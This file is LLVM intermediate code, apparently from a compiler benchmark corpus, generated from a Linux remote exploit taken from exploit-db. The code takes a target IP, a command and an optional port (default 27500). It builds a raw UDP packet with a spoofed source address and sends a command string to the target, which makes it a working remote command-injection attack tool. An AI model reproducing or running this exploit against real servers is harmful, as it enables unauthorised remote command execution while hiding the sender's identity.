; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19079.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19079.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i8*, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.iphdr = type { i32, i32, i32, i32, i32, i32, i64, i8*, i8*, i64 }
%struct.udphdr = type { i8*, i8*, i8* }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [8 x i8] c"usage:\0A\00", align 1
@.str.1 = private unnamed_addr constant [23 x i8] c"\09%s ip command <port>\0A\00", align 1
@SIP = common dso_local global i32 0, align 4
@PF_INET = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [6 x i8] c"%s%s\0A\00", align 1
@command = common dso_local global i8* null, align 8
@SOCK_RAW = common dso_local global i32 0, align 4
@IPPROTO_RAW = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"sendto\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  %9 = alloca %struct.sockaddr_in, align 8
  %10 = alloca %struct.iphdr*, align 8
  %11 = alloca %struct.udphdr*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 27500, i32* %7, align 4
  %12 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %13 = bitcast i8* %12 to %struct.iphdr*
  store %struct.iphdr* %13, %struct.iphdr** %10, align 8
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %15 = getelementptr inbounds i8, i8* %14, i64 20
  %16 = bitcast i8* %15 to %struct.udphdr*
  store %struct.udphdr* %16, %struct.udphdr** %11, align 8
  %17 = load i32, i32* %4, align 4
  %18 = icmp slt i32 %17, 3
  br i1 %18, label %19, label %26

19:                                               ; preds = %2
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0))
  %21 = load i8**, i8*** %5, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0), i8* %23)
  %25 = call i32 @exit(i32 -1) #3
  unreachable

26:                                               ; preds = %2
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, 4
  br i1 %28, label %29, label %34

29:                                               ; preds = %26
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 3
  %32 = load i8*, i8** %31, align 8
  %33 = call i32 @atoi(i8* %32)
  store i32 %33, i32* %7, align 4
  br label %34

34:                                               ; preds = %29, %26
  %35 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %36 = call i32 @bzero(i8* %35, i32 512)
  %37 = bitcast %struct.sockaddr_in* %9 to i8*
  %38 = call i32 @bzero(i8* %37, i32 16)
  %39 = load %struct.iphdr*, %struct.iphdr** %10, align 8
  %40 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %39, i32 0, i32 0
  store i32 4, i32* %40, align 8
  %41 = load %struct.iphdr*, %struct.iphdr** %10, align 8
  %42 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %41, i32 0, i32 1
  store i32 5, i32* %42, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %10, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 9
  store i64 0, i64* %44, align 8
  %45 = call i8* @htons(i32 512)
  %46 = load %struct.iphdr*, %struct.iphdr** %10, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 8
  store i8* %45, i8** %47, align 8
  %48 = call i8* @htons(i32 1234)
  %49 = load %struct.iphdr*, %struct.iphdr** %10, align 8
  %50 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %49, i32 0, i32 7
  store i8* %48, i8** %50, align 8
  %51 = load %struct.iphdr*, %struct.iphdr** %10, align 8
  %52 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %51, i32 0, i32 6
  store i64 0, i64* %52, align 8
  %53 = load %struct.iphdr*, %struct.iphdr** %10, align 8
  %54 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %53, i32 0, i32 2
  store i32 255, i32* %54, align 8
  %55 = load %struct.iphdr*, %struct.iphdr** %10, align 8
  %56 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %55, i32 0, i32 3
  store i32 17, i32* %56, align 4
  %57 = load i32, i32* @SIP, align 4
  %58 = call i32 @inet_addr(i32 %57)
  %59 = load %struct.iphdr*, %struct.iphdr** %10, align 8
  %60 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %59, i32 0, i32 5
  store i32 %58, i32* %60, align 4
  %61 = load i8**, i8*** %5, align 8
  %62 = getelementptr inbounds i8*, i8** %61, i64 1
  %63 = load i8*, i8** %62, align 8
  %64 = call i32 @resolve_address(i8* %63)
  %65 = load %struct.iphdr*, %struct.iphdr** %10, align 8
  %66 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %65, i32 0, i32 4
  store i32 %64, i32* %66, align 8
  %67 = call i8* @htons(i32 1234)
  %68 = load %struct.udphdr*, %struct.udphdr** %11, align 8
  %69 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %68, i32 0, i32 2
  store i8* %67, i8** %69, align 8
  %70 = load i32, i32* %7, align 4
  %71 = call i8* @htons(i32 %70)
  %72 = load %struct.udphdr*, %struct.udphdr** %11, align 8
  %73 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %72, i32 0, i32 1
  store i8* %71, i8** %73, align 8
  %74 = call i8* @htons(i32 492)
  %75 = load %struct.udphdr*, %struct.udphdr** %11, align 8
  %76 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %75, i32 0, i32 0
  store i8* %74, i8** %76, align 8
  %77 = load i32, i32* @PF_INET, align 4
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  store i32 %77, i32* %78, align 4
  %79 = load %struct.iphdr*, %struct.iphdr** %10, align 8
  %80 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %79, i32 0, i32 4
  %81 = load i32, i32* %80, align 8
  %82 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  %83 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %82, i32 0, i32 0
  store i32 %81, i32* %83, align 8
  %84 = call i8* @htons(i32 27500)
  %85 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i8* %84, i8** %85, align 8
  %86 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %87 = getelementptr inbounds i8, i8* %86, i64 28
  %88 = load i8*, i8** @command, align 8
  %89 = load i8**, i8*** %5, align 8
  %90 = getelementptr inbounds i8*, i8** %89, i64 2
  %91 = load i8*, i8** %90, align 8
  %92 = call i32 @sprintf(i8* %87, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0), i8* %88, i8* %91)
  %93 = load i32, i32* @PF_INET, align 4
  %94 = load i32, i32* @SOCK_RAW, align 4
  %95 = load i32, i32* @IPPROTO_RAW, align 4
  %96 = call i32 @socket(i32 %93, i32 %94, i32 %95)
  store i32 %96, i32* %6, align 4
  %97 = icmp slt i32 %96, 0
  br i1 %97, label %98, label %101

98:                                               ; preds = %34
  %99 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  %100 = call i32 @exit(i32 -1) #3
  unreachable

101:                                              ; preds = %34
  %102 = load i32, i32* %6, align 4
  %103 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %104 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %105 = call i64 @sendto(i32 %102, i8* %103, i32 512, i32 0, %struct.sockaddr* %104, i32 16)
  %106 = icmp sle i64 %105, 0
  br i1 %106, label %107, label %110

107:                                              ; preds = %101
  %108 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  %109 = call i32 @exit(i32 -1) #3
  unreachable

110:                                              ; preds = %101
  %111 = call i32 @exit(i32 1) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @inet_addr(i32) #1

declare dso_local i32 @resolve_address(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*, i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i64 @sendto(i32, i8*, i32, i32, %struct.sockaddr*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
